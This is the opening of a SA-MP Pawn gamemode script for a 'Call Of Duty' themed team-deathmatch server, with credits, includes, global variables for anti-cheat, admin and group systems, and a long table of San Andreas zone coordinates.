/*
					------==== 2015 ====------
					Call Of Duty - Real World at War II™
					Official Xenon Professional Gaming™ Script
					By, [R]aM[P]aGe A.k.a [YGC]SrizZ A.k.a iThe[YGC]Pro

					Do Not SCAM/Sell script. If Scammed, then it will lead to ban in forum.sa-mp.com

					COD_RWWII™ - - - TDM - - - V10.9.2 - - - xenon-extreme.com
					------===== [R]aM[P]aGe Rocks =====------
					Version V10.9.6 by Rampage aka Srijan(DAAAAAAAAAARK) Abhay.Sv aka [XP]Perfect_Boy

									        _______
									    .adOOOOOOOOOba.
									   dOOOOOOOOOOOOOOOb
									  dOOOOOOOOOOOOOOOOOb
									 dOOOOOOOOOOOOOOOOOOOb
									|OOOOOOOOOOOOOOOOOOOOO|
									OP'~"YOOOOOOOOOOOP"~`YO
									OO     `YOOOOOP'     OO
									OOb      `OOO'      dOO
									YOOo  &   OOO   &  oOOP
									`OOOo     OOO     oOOO'
									 `OOOb._,dOOOb._,dOOO'
									  `OOOOOOOOOOOOOOOOO'
									   OOOOOOOOOOOOOOOOO
									   YOOOOOOOOOOOOOOOP
									   `OOOOOOOOOOOOOOO'
									    `OOOOOOOOOOOOO
									     `OOOOOOOOOOO'
									       `~OOOOO~'
                    ««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««
                    »»                                                                        ««
                    »» Scripter 			       : Abhay SV (Perfect_Boy) , Mex_Ivanov      ««
                    »» Edite                      : Perfect_Boy                               ««
                    »» Maps Editor 		          :  Rampage , Perfect_Boy , Kitty            ««
                    »» Admins System New          : Perfect_Boy                               ««
                    »» SQL SYSTEM                 :  Perfect_Boy                              ««
                    »» Anti Cheat                 : Perfect_boy , Rampage , Mex_Ivanov        ««
                    »» Beta Testesters            :  [XP]Sumeeth                              ««
                    »»                                                                        ««
                    »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»


*/


/*

SQL DUMP

ALTER TABLE playerdata ADD adminlevel INT(20), oplevel INT(20), pkills INT(20), pdeaths INT(20), dlevel INT(20), phours INT(20), pminutes INT(20), pseconds INT(20)
*/

#include <a_samp>
#include <AntiCheat>
#include <sscanf2>
#include <streamer>
#include <boxmsg>
#include <zcmd>
#include <Dini>
#include <Dutils>
#include <FloodControl>
#include <fuckCleo>
#include <lethaldudb2>
#include <SII>
#include <foreach>
#include <Dudb>
#include <a_mysql>

/*********************************************************************************************************/
/*                                       SERVER INCLUDES                                                 */
/*********************************************************************************************************/
#include "../modules/server/configs.inc"
#include "../modules/maps/main.inc"
#include "../modules/vehicles/main.inc"
#include "../modules/admin/main.inc"
#include "../modules/teams/main.inc"
#include "../modules/paths/main.inc"
#include "../modules/player/main.inc"
#include "../modules/randommessages/main.inc"
#include "../modules/irc/main.inc"


//=============================================================================

new SpeedHacking[MAX_PLAYERS];
#define SpeedCheck(%0,%1,%2,%3,%4) floatround(floatsqroot(%4?(%0*%0+%1*%1+%2*%2):(%0*%0+%1*%1) ) *%3*1.6)


//++++++++++++++++++++++ANti Cheat By Perfect And Mex ++++++++++++++++++++++
new grider[MAX_PLAYERS][3];

new shot[MAX_PLAYERS];
new shotTime[MAX_PLAYERS];

new
	enablearf = 1;
new
	enablecrash = 1;

new
	enablecar = 1;

new
	recovery = 1;

new
	dsay = 0;
	
new
	hs_normal = 0;

new
	hs_sniper = 0;
///////////////////////////////////////////////////////////////////////
new JetPack[MAX_PLAYERS];
new Cash[MAX_PLAYERS];
////////////////////////////////////////////////////////////////////////////////

//+++++++++++++++++++++++++++   BUG FIX TRYING INTRODUCING A NEW VAR+++++++++++++++++++++++
new bool:IsPlayerSpawned[MAX_PLAYERS];

new buggy[MAX_PLAYERS];


new Deejay[MAX_PLAYERS];

//======================================================================================

new findtimer[MAX_PLAYERS];//on top
new Finding[MAX_PLAYERS];
//+++++++++++++++++++++SQL SYSTEM++++++++++++++++++++++++++++++++++


new IsRegistered[MAX_PLAYERS];
//We are using this variable so we don't have to query later to
//check if the player is registered in the database.

new MoneyGiven[MAX_PLAYERS]; //Explained in the paragraph above.
new Logged[MAX_PLAYERS];

new License[MAX_PLAYERS];
new TempAdmin[MAX_PLAYERS];
new MinigunDM[MAX_PLAYERS];

new PlayerEnterTime[MAX_PLAYERS];

//====================== PATRIOT===================================
new IsPTBAllowed[MAX_PLAYERS];


#define COLOR_LIME 0x10F441FF

new BomberPatriot[10], PatriotObject[10];
//============================================================



    //Variables
#define MAX_GROUPS 20 // Change this if you think you are going to ever have over 100 groups.

enum ginfo
{
	grname[50],
 	leader,
  	active
};

enum pginfo
{
	gid,
 	order,
  	invited,
   	attemptjoin
};

new group[MAX_PLAYERS][pginfo];
new groupinfo[MAX_GROUPS][ginfo];





//==============================Prototype sys
/*
new Text3D:ProtLabel[MAX_VEHICLES];
new A69Prot;
new StealingA69Prot[MAX_PLAYERS];
*/
//=========================Admin area global var=====================

//____[Gates & other]____
new meetinggate;
new cabingate;
new maingate;

//________[Admin Vehicle (Hydra)|______________


//____[Forwards-Timers]____
forward MeetingGateClose(playerid);
forward CabinGateClose(playerid);
forward MainGateClose(playerid);

//=====================Wizzard DumbleDore=======================

forward uselessnrg();

//======================================================================


new Text3D:Dis[MAX_PLAYERS];
new Text:Zones[MAX_PLAYERS];
new PingTimer;
new bool:Synching[MAX_PLAYERS];
new Float:sPos[MAX_PLAYERS][3];
new Float:sHP[MAX_PLAYERS];
new Float:sAP[MAX_PLAYERS];
new sWeap[MAX_PLAYERS][13];
new sAmmo[MAX_PLAYERS][13];
new warnmsg[MAX_PLAYERS] = 0;
new PlayersOnline;
new EnableBot = 0;
new park;
new pVehicles[MAX_PLAYERS];
new nuke_time;
new anthraxpickup;
new anthrax_time;
new MyFirstNPCVehicle;
// Anti Flood //

new IsPlayerUsingAnims[MAX_PLAYERS];
new IsPlayerAnimsPreloaded[MAX_PLAYERS];

forward destroyThisObject(objid);
forward EnableCMD(playerid,cmdid);
new SL;
new SLL;
new bool:Block_CMD[MAX_PLAYERS][100];



new VIP[32],Vnewban[32],Vstring[200],NICKBAN[20];

#define 	IPI 			INVALID_PLAYER_ID
#define 	SCM 			SendClientMessage
#define 	SCMToAll 		SendClientMessageToAll
#define IP_LIMIT 3 // = Max connections from one single IP
#define Time_Limit 3500 // = The time span between connects, adjust it to your own specifications

#define SNAKE 1  //Snakes farm
#define BAY 2 //Bay side sea shore
#define BIG 3 //Area 69
#define ARMY 4 //army restaurant
#define PETROL 5 //army petrol bunk
#define OIL 6 //oil factory
#define DESERT 7 //gas station
#define QUARRY 8 //Quarry
#define GUEST 9 //Army guest house
#define EAR 10 //Big ear
#define CITY 11
#define BRIDGE 12
#define CLUCKIN 13
#define BASE 14
#define DP 15
#define HILL 16
#define SUBS 17

#if !defined isnull
    #define isnull(%1) \
                ((!(%1[0])) || (((%1[0]) == '\1') && (!(%1[1]))))
#endif

new ID[MAX_PLAYERS];
new AntiSK[MAX_PLAYERS];
new PingPos;
new rconAttempts[MAX_PLAYERS];
new DND[MAX_PLAYERS];
new LastPm[MAX_PLAYERS];
new Pickup[20];
new Text3D:Labels[29];
new FirstSpawn[MAX_PLAYERS];
new Spectating[MAX_PLAYERS];
//==========RANDOM SPAWNS=========================//
enum SAZONE_MAIN { //Betamaster
		SAZONE_NAME[28],
		Float:SAZONE_AREA[6]
};
static const gSAZones[][SAZONE_MAIN] = {
	//	NAME                            AREA (Xmin,Ymin,Zmin,Xmax,Ymax,Zmax)
	{"The Big Ear",	                {-410.00,1403.30,-3.00,-137.90,1681.20,200.00}},
	{"Aldea Malvada",               {-1372.10,2498.50,0.00,-1277.50,2615.30,200.00}},
	{"Angel Pine",                  {-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00}},
	{"Arco del Oeste",              {-901.10,2221.80,0.00,-592.00,2571.90,200.00}},
	{"Avispa Country Club",         {-2646.40,-355.40,0.00,-2270.00,-222.50,200.00}},
	{"Avispa Country Club",         {-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00}},
	{"Avispa Country Club",         {-2361.50,-417.10,0.00,-2270.00,-355.40,200.00}},
	{"Avispa Country Club",         {-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10}},
	{"Avispa Country Club",         {-2470.00,-355.40,0.00,-2270.00,-318.40,46.10}},
	{"Avispa Country Club",         {-2550.00,-355.40,0.00,-2470.00,-318.40,39.70}},
	{"Back o Beyond",               {-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00}},
	{"Battery Point",               {-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00}},
	{"Bayside",                     {-2741.00,2175.10,0.00,-2353.10,2722.70,200.00}},
	{"Bayside Marina",              {-2353.10,2275.70,0.00,-2153.10,2475.70,200.00}},
	{"Beacon Hill",                 {-399.60,-1075.50,-1.40,-319.00,-977.50,198.50}},
	{"Blackfield",                  {964.30,1203.20,-89.00,1197.30,1403.20,110.90}},
	{"Blackfield",                  {964.30,1403.20,-89.00,1197.30,1726.20,110.90}},
	{"Blackfield Chapel",           {1375.60,596.30,-89.00,1558.00,823.20,110.90}},
	{"Blackfield Chapel",           {1325.60,596.30,-89.00,1375.60,795.00,110.90}},
	{"Blackfield Intersection",     {1197.30,1044.60,-89.00,1277.00,1163.30,110.90}},
	{"Blackfield Intersection",     {1166.50,795.00,-89.00,1375.60,1044.60,110.90}},
	{"Blackfield Intersection",     {1277.00,1044.60,-89.00,1315.30,1087.60,110.90}},
	{"Blackfield Intersection",     {1375.60,823.20,-89.00,1457.30,919.40,110.90}},
	{"Blueberry",                   {104.50,-220.10,2.30,349.60,152.20,200.00}},
	{"Blueberry",                   {19.60,-404.10,3.80,349.60,-220.10,200.00}},
	{"Blueberry Acres",             {-319.60,-220.10,0.00,104.50,293.30,200.00}},
	{"Caligula's Palace",           {2087.30,1543.20,-89.00,2437.30,1703.20,110.90}},
	{"Caligula's Palace",           {2137.40,1703.20,-89.00,2437.30,1783.20,110.90}},
	{"Calton Heights",              {-2274.10,744.10,-6.10,-1982.30,1358.90,200.00}},
	{"Chinatown",                   {-2274.10,578.30,-7.60,-2078.60,744.10,200.00}},
	{"City Hall",                   {-2867.80,277.40,-9.10,-2593.40,458.40,200.00}},
	{"Come-A-Lot",                  {2087.30,943.20,-89.00,2623.10,1203.20,110.90}},
	{"Commerce",                    {1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90}},
	{"Commerce",                    {1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90}},
	{"Commerce",                    {1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90}},
	{"Commerce",                    {1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90}},
	{"Commerce",                    {1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90}},
	{"Commerce",                    {1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90}},
	{"Conference Center",           {1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90}},
	{"Conference Center",           {1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90}},
	{"Cranberry Station",           {-2007.80,56.30,0.00,-1922.00,224.70,100.00}},
	{"Creek",                       {2749.90,1937.20,-89.00,2921.60,2669.70,110.90}},
	{"Dillimore",                   {580.70,-674.80,-9.50,861.00,-404.70,200.00}},
	{"Doherty",                     {-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00}},
	{"Doherty",                     {-2173.00,-222.50,-0.00,-1794.90,265.20,200.00}},
	{"Downtown",                    {-1982.30,744.10,-6.10,-1871.70,1274.20,200.00}},
	{"Downtown",                    {-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00}},
	{"Downtown",                    {-1700.00,744.20,-6.10,-1580.00,1176.50,200.00}},
	{"Downtown",                    {-1580.00,744.20,-6.10,-1499.80,1025.90,200.00}},
	{"Downtown",                    {-2078.60,578.30,-7.60,-1499.80,744.20,200.00}},
	{"Downtown",                    {-1993.20,265.20,-9.10,-1794.90,578.30,200.00}},
	{"Downtown Los Angeles",         {1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90}},
	{"Downtown Los Angeles",         {1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90}},
	{"Downtown Los Angeles",         {1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90}},
	{"Downtown Los Angeles",         {1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90}},
	{"Downtown Los Angeles",         {1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90}},
	{"Downtown Los Angeles",         {1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90}},
	{"Downtown Los Angeles",         {1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90}},
	{"Downtown Los Angeles",         {1391.00,-1026.30,-89.00,1463.90,-926.90,110.90}},
	{"Downtown Los Angeles",         {1507.50,-1385.20,110.90,1582.50,-1325.30,335.90}},
	{"East Beach",                  {2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90}},
	{"East Beach",                  {2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90}},
	{"East Beach",                  {2747.70,-1668.10,-89.00,2959.30,-1498.60,110.90}},
	{"East Beach",                  {2747.70,-1498.60,-89.00,2959.30,-1120.00,110.90}},
	{"East Los Angeles",             {2421.00,-1628.50,-89.00,2632.80,-1454.30,110.90}},
	{"East Los Angeles",             {2222.50,-1628.50,-89.00,2421.00,-1494.00,110.90}},
	{"East Los Angeles",             {2266.20,-1494.00,-89.00,2381.60,-1372.00,110.90}},
	{"East Los Angeles",             {2381.60,-1494.00,-89.00,2421.00,-1454.30,110.90}},
	{"East Los Angeles",             {2281.40,-1372.00,-89.00,2381.60,-1135.00,110.90}},
	{"East Los Angeles",             {2381.60,-1454.30,-89.00,2462.10,-1135.00,110.90}},
	{"East Los Angeles",             {2462.10,-1454.30,-89.00,2581.70,-1135.00,110.90}},
	{"Easter Basin",                {-1794.90,249.90,-9.10,-1242.90,578.30,200.00}},
	{"Easter Basin",                {-1794.90,-50.00,-0.00,-1499.80,249.90,200.00}},
	{"Easter Bay Airport",          {-1499.80,-50.00,-0.00,-1242.90,249.90,200.00}},
	{"Easter Bay Airport",          {-1794.90,-730.10,-3.00,-1213.90,-50.00,200.00}},
	{"Easter Bay Airport",          {-1213.90,-730.10,0.00,-1132.80,-50.00,200.00}},
	{"Easter Bay Airport",          {-1242.90,-50.00,0.00,-1213.90,578.30,200.00}},
	{"Easter Bay Airport",          {-1213.90,-50.00,-4.50,-947.90,578.30,200.00}},
	{"Easter Bay Airport",          {-1315.40,-405.30,15.40,-1264.40,-209.50,25.40}},
	{"Easter Bay Airport",          {-1354.30,-287.30,15.40,-1315.40,-209.50,25.40}},
	{"Easter Bay Airport",          {-1490.30,-209.50,15.40,-1264.40,-148.30,25.40}},
	{"Easter Bay Chemicals",        {-1132.80,-768.00,0.00,-956.40,-578.10,200.00}},
	{"Easter Bay Chemicals",        {-1132.80,-787.30,0.00,-956.40,-768.00,200.00}},
	{"El Castillo del Diablo",      {-464.50,2217.60,0.00,-208.50,2580.30,200.00}},
	{"El Castillo del Diablo",      {-208.50,2123.00,-7.60,114.00,2337.10,200.00}},
	{"El Castillo del Diablo",      {-208.50,2337.10,0.00,8.40,2487.10,200.00}},
	{"El Corona",                   {1812.60,-2179.20,-89.00,1970.60,-1852.80,110.90}},
	{"El Corona",                   {1692.60,-2179.20,-89.00,1812.60,-1842.20,110.90}},
	{"El Quebrados",                {-1645.20,2498.50,0.00,-1372.10,2777.80,200.00}},
	{"Esplanade East",              {-1620.30,1176.50,-4.50,-1580.00,1274.20,200.00}},
	{"Esplanade East",              {-1580.00,1025.90,-6.10,-1499.80,1274.20,200.00}},
	{"Esplanade East",              {-1499.80,578.30,-79.60,-1339.80,1274.20,20.30}},
	{"Esplanade North",             {-2533.00,1358.90,-4.50,-1996.60,1501.20,200.00}},
	{"Esplanade North",             {-1996.60,1358.90,-4.50,-1524.20,1592.50,200.00}},
	{"Esplanade North",             {-1982.30,1274.20,-4.50,-1524.20,1358.90,200.00}},
	{"Fallen Tree",                 {-792.20,-698.50,-5.30,-452.40,-380.00,200.00}},
	{"Fallow Bridge",               {434.30,366.50,0.00,603.00,555.60,200.00}},
	{"Fern Ridge",                  {508.10,-139.20,0.00,1306.60,119.50,200.00}},
	{"Financial",                   {-1871.70,744.10,-6.10,-1701.30,1176.40,300.00}},
	{"Fisher's Lagoon",             {1916.90,-233.30,-100.00,2131.70,13.80,200.00}},
	{"Flint Intersection",          {-187.70,-1596.70,-89.00,17.00,-1276.60,110.90}},
	{"Flint Range",                 {-594.10,-1648.50,0.00,-187.70,-1276.60,200.00}},
	{"Fort Carson",                 {-376.20,826.30,-3.00,123.70,1220.40,200.00}},
	{"Foster Valley",               {-2270.00,-430.20,-0.00,-2178.60,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-599.80,-0.00,-1794.90,-324.10,200.00}},
	{"Foster Valley",               {-2178.60,-1115.50,0.00,-1794.90,-599.80,200.00}},
	{"Foster Valley",               {-2178.60,-1250.90,0.00,-1794.90,-1115.50,200.00}},
	{"Frederick Bridge",            {2759.20,296.50,0.00,2774.20,594.70,200.00}},
	{"Gant Bridge",                 {-2741.40,1659.60,-6.10,-2616.40,2175.10,200.00}},
	{"Gant Bridge",                 {-2741.00,1490.40,-6.10,-2616.40,1659.60,200.00}},
	{"Ganton",                      {2222.50,-1852.80,-89.00,2632.80,-1722.30,110.90}},
	{"Ganton",                      {2222.50,-1722.30,-89.00,2632.80,-1628.50,110.90}},
	{"Garcia",                      {-2411.20,-222.50,-0.00,-2173.00,265.20,200.00}},
	{"Garcia",                      {-2395.10,-222.50,-5.30,-2354.00,-204.70,200.00}},
	{"Garver Bridge",               {-1339.80,828.10,-89.00,-1213.90,1057.00,110.90}},
	{"Garver Bridge",               {-1213.90,950.00,-89.00,-1087.90,1178.90,110.90}},
	{"Garver Bridge",               {-1499.80,696.40,-179.60,-1339.80,925.30,20.30}},
	{"Glen Park",                   {1812.60,-1449.60,-89.00,1996.90,-1350.70,110.90}},
	{"Glen Park",                   {1812.60,-1100.80,-89.00,1994.30,-973.30,110.90}},
	{"Glen Park",                   {1812.60,-1350.70,-89.00,2056.80,-1100.80,110.90}},
	{"Green Palms",                 {176.50,1305.40,-3.00,338.60,1520.70,200.00}},
	{"Greenglass College",          {964.30,1044.60,-89.00,1197.30,1203.20,110.90}},
	{"Greenglass College",          {964.30,930.80,-89.00,1166.50,1044.60,110.90}},
	{"Hampton Barns",               {603.00,264.30,0.00,761.90,366.50,200.00}},
	{"Hankypanky Point",            {2576.90,62.10,0.00,2759.20,385.50,200.00}},
	{"Harry Gold Parkway",          {1777.30,863.20,-89.00,1817.30,2342.80,110.90}},
	{"Hashbury",                    {-2593.40,-222.50,-0.00,-2411.20,54.70,200.00}},
	{"Hilltop Farm",                {967.30,-450.30,-3.00,1176.70,-217.90,200.00}},
	{"Hunter Quarry",               {337.20,710.80,-115.20,860.50,1031.70,203.70}},
	{"Idlewood",                    {1812.60,-1852.80,-89.00,1971.60,-1742.30,110.90}},
	{"Idlewood",                    {1812.60,-1742.30,-89.00,1951.60,-1602.30,110.90}},
	{"Idlewood",                    {1951.60,-1742.30,-89.00,2124.60,-1602.30,110.90}},
	{"Idlewood",                    {1812.60,-1602.30,-89.00,2124.60,-1449.60,110.90}},
	{"Idlewood",                    {2124.60,-1742.30,-89.00,2222.50,-1494.00,110.90}},
	{"Idlewood",                    {1971.60,-1852.80,-89.00,2222.50,-1742.30,110.90}},
	{"Jefferson",                   {1996.90,-1449.60,-89.00,2056.80,-1350.70,110.90}},
	{"Jefferson",                   {2124.60,-1494.00,-89.00,2266.20,-1449.60,110.90}},
	{"Jefferson",                   {2056.80,-1372.00,-89.00,2281.40,-1210.70,110.90}},
	{"Jefferson",                   {2056.80,-1210.70,-89.00,2185.30,-1126.30,110.90}},
	{"Jefferson",                   {2185.30,-1210.70,-89.00,2281.40,-1154.50,110.90}},
	{"Jefferson",                   {2056.80,-1449.60,-89.00,2266.20,-1372.00,110.90}},
	{"Julius Thruway East",         {2623.10,943.20,-89.00,2749.90,1055.90,110.90}},
	{"Julius Thruway East",         {2685.10,1055.90,-89.00,2749.90,2626.50,110.90}},
	{"Julius Thruway East",         {2536.40,2442.50,-89.00,2685.10,2542.50,110.90}},
	{"Julius Thruway East",         {2625.10,2202.70,-89.00,2685.10,2442.50,110.90}},
	{"Julius Thruway North",        {2498.20,2542.50,-89.00,2685.10,2626.50,110.90}},
	{"Julius Thruway North",        {2237.40,2542.50,-89.00,2498.20,2663.10,110.90}},
	{"Julius Thruway North",        {2121.40,2508.20,-89.00,2237.40,2663.10,110.90}},
	{"Julius Thruway North",        {1938.80,2508.20,-89.00,2121.40,2624.20,110.90}},
	{"Julius Thruway North",        {1534.50,2433.20,-89.00,1848.40,2583.20,110.90}},
	{"Julius Thruway North",        {1848.40,2478.40,-89.00,1938.80,2553.40,110.90}},
	{"Julius Thruway North",        {1704.50,2342.80,-89.00,1848.40,2433.20,110.90}},
	{"Julius Thruway North",        {1377.30,2433.20,-89.00,1534.50,2507.20,110.90}},
	{"Julius Thruway South",        {1457.30,823.20,-89.00,2377.30,863.20,110.90}},
	{"Julius Thruway South",        {2377.30,788.80,-89.00,2537.30,897.90,110.90}},
	{"Julius Thruway West",         {1197.30,1163.30,-89.00,1236.60,2243.20,110.90}},
	{"Julius Thruway West",         {1236.60,2142.80,-89.00,1297.40,2243.20,110.90}},
	{"Juniper Hill",                {-2533.00,578.30,-7.60,-2274.10,968.30,200.00}},
	{"Juniper Hollow",              {-2533.00,968.30,-6.10,-2274.10,1358.90,200.00}},
	{"K.A.C.C. Military Fuels",     {2498.20,2626.50,-89.00,2749.90,2861.50,110.90}},
	{"Kincaid Bridge",              {-1339.80,599.20,-89.00,-1213.90,828.10,110.90}},
	{"Kincaid Bridge",              {-1213.90,721.10,-89.00,-1087.90,950.00,110.90}},
	{"Kincaid Bridge",              {-1087.90,855.30,-89.00,-961.90,986.20,110.90}},
	{"King's",                      {-2329.30,458.40,-7.60,-1993.20,578.30,200.00}},
	{"King's",                      {-2411.20,265.20,-9.10,-1993.20,373.50,200.00}},
	{"King's",                      {-2253.50,373.50,-9.10,-1993.20,458.40,200.00}},
	{"LVA Freight Depot",           {1457.30,863.20,-89.00,1777.40,1143.20,110.90}},
	{"LVA Freight Depot",           {1375.60,919.40,-89.00,1457.30,1203.20,110.90}},
	{"LVA Freight Depot",           {1277.00,1087.60,-89.00,1375.60,1203.20,110.90}},
	{"LVA Freight Depot",           {1315.30,1044.60,-89.00,1375.60,1087.60,110.90}},
	{"LVA Freight Depot",           {1236.60,1163.40,-89.00,1277.00,1203.20,110.90}},
	{"Las Barrancas",               {-926.10,1398.70,-3.00,-719.20,1634.60,200.00}},
	{"Las Brujas",                  {-365.10,2123.00,-3.00,-208.50,2217.60,200.00}},
	{"Las Colinas",                 {1994.30,-1100.80,-89.00,2056.80,-920.80,110.90}},
	{"Las Colinas",                 {2056.80,-1126.30,-89.00,2126.80,-920.80,110.90}},
	{"Las Colinas",                 {2185.30,-1154.50,-89.00,2281.40,-934.40,110.90}},
	{"Las Colinas",                 {2126.80,-1126.30,-89.00,2185.30,-934.40,110.90}},
	{"Las Colinas",                 {2747.70,-1120.00,-89.00,2959.30,-945.00,110.90}},
	{"Las Colinas",                 {2632.70,-1135.00,-89.00,2747.70,-945.00,110.90}},
	{"Las Colinas",                 {2281.40,-1135.00,-89.00,2632.70,-945.00,110.90}},
	{"Las Payasadas",               {-253.6761,2595.2136,70.6953,183.0496}},
	{"Las Venturas Airport",        {1236.60,1203.20,-89.00,1457.30,1883.10,110.90}},
	{"Las Venturas Airport",        {1457.30,1203.20,-89.00,1777.30,1883.10,110.90}},
	{"Las Venturas Airport",        {1457.30,1143.20,-89.00,1777.40,1203.20,110.90}},
	{"Las Venturas Airport",        {1515.80,1586.40,-12.50,1729.90,1714.50,87.50}},
	{"Last Dime Motel",             {1823.00,596.30,-89.00,1997.20,823.20,110.90}},
	{"Leafy Hollow",                {-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00}},
	{"Liberty City",                {-1000.00,400.00,1300.00,-700.00,600.00,1400.00}},
	{"Lil' Probe Inn",              {-90.20,1286.80,-3.00,153.80,1554.10,200.00}},
	{"Linden Side",                 {2749.90,943.20,-89.00,2923.30,1198.90,110.90}},
	{"Linden Station",              {2749.90,1198.90,-89.00,2923.30,1548.90,110.90}},
	{"Linden Station",              {2811.20,1229.50,-39.50,2861.20,1407.50,60.40}},
	{"Little Mexico",               {1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90}},
	{"Little Mexico",               {1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90}},
	{"Los Flores",                  {2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90}},
	{"Los Flores",                  {2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90}},
	{"Los Angeles International",    {1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90}},
	{"Los Angeles International",    {1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90}},
	{"Los Angeles International",    {1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90}},
	{"Los Angeles International",    {1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90}},
	{"Los Angeles International",    {1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90}},
	{"Los Angeles International",    {2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90}},
	{"Marina",                      {647.70,-1804.20,-89.00,851.40,-1577.50,110.90}},
	{"Marina",                      {647.70,-1577.50,-89.00,807.90,-1416.20,110.90}},
	{"Marina",                      {807.90,-1577.50,-89.00,926.90,-1416.20,110.90}},
	{"Market",                      {787.40,-1416.20,-89.00,1072.60,-1310.20,110.90}},
	{"Market",                      {952.60,-1310.20,-89.00,1072.60,-1130.80,110.90}},
	{"Market",                      {1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90}},
	{"Market",                      {926.90,-1577.50,-89.00,1370.80,-1416.20,110.90}},
	{"Market Station",              {787.40,-1410.90,-34.10,866.00,-1310.20,65.80}},
	{"Martin Bridge",               {-222.10,293.30,0.00,-122.10,476.40,200.00}},
	{"Missionary Hill",             {-2994.40,-811.20,0.00,-2178.60,-430.20,200.00}},
	{"Montgomery",                  {1119.50,119.50,-3.00,1451.40,493.30,200.00}},
	{"Montgomery",                  {1451.40,347.40,-6.10,1582.40,420.80,200.00}},
	{"Montgomery Intersection",     {1546.60,208.10,0.00,1745.80,347.40,200.00}},
	{"Montgomery Intersection",     {1582.40,347.40,0.00,1664.60,401.70,200.00}},
	{"Mulholland",                  {1414.00,-768.00,-89.00,1667.60,-452.40,110.90}},
	{"Mulholland",                  {1281.10,-452.40,-89.00,1641.10,-290.90,110.90}},
	{"Mulholland",                  {1269.10,-768.00,-89.00,1414.00,-452.40,110.90}},
	{"Mulholland",                  {1357.00,-926.90,-89.00,1463.90,-768.00,110.90}},
	{"Mulholland",                  {1318.10,-910.10,-89.00,1357.00,-768.00,110.90}},
	{"Mulholland",                  {1169.10,-910.10,-89.00,1318.10,-768.00,110.90}},
	{"Mulholland",                  {768.60,-954.60,-89.00,952.60,-860.60,110.90}},
	{"Mulholland",                  {687.80,-860.60,-89.00,911.80,-768.00,110.90}},
	{"Mulholland",                  {737.50,-768.00,-89.00,1142.20,-674.80,110.90}},
	{"Mulholland",                  {1096.40,-910.10,-89.00,1169.10,-768.00,110.90}},
	{"Mulholland",                  {952.60,-937.10,-89.00,1096.40,-860.60,110.90}},
	{"Mulholland",                  {911.80,-860.60,-89.00,1096.40,-768.00,110.90}},
	{"Mulholland",                  {861.00,-674.80,-89.00,1156.50,-600.80,110.90}},
	{"Mulholland Intersection",     {1463.90,-1150.80,-89.00,1812.60,-768.00,110.90}},
	{"North Rock",                  {2285.30,-768.00,0.00,2770.50,-269.70,200.00}},
	{"Ocean Docks",                 {2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90}},
	{"Ocean Docks",                 {2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90}},
	{"Ocean Docks",                 {2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90}},
	{"Ocean Docks",                 {2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90}},
	{"Ocean Docks",                 {2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90}},
	{"Ocean Docks",                 {2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90}},
	{"Ocean Docks",                 {2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90}},
	{"Ocean Flats",                 {-2994.40,277.40,-9.10,-2867.80,458.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-222.50,-0.00,-2593.40,277.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00}},
	{"Octane Springs",              {338.60,1228.50,0.00,664.30,1655.00,200.00}},
	{"Old Venturas Strip",          {2162.30,2012.10,-89.00,2685.10,2202.70,110.90}},
	{"Palisades",                   {-2994.40,458.40,-6.10,-2741.00,1339.60,200.00}},
	{"Palomino Creek",              {2160.20,-149.00,0.00,2576.90,228.30,200.00}},
	{"Paradiso",                    {-2741.00,793.40,-6.10,-2533.00,1268.40,200.00}},
	{"Pershing Square",             {1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90}},
	{"Pilgrim",                     {2437.30,1383.20,-89.00,2624.40,1783.20,110.90}},
	{"Pilgrim",                     {2624.40,1383.20,-89.00,2685.10,1783.20,110.90}},
	{"Pilson Intersection",         {1098.30,2243.20,-89.00,1377.30,2507.20,110.90}},
	{"Pirates in Men's Pants",      {1817.30,1469.20,-89.00,2027.40,1703.20,110.90}},
	{"Playa del Seville",           {2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90}},
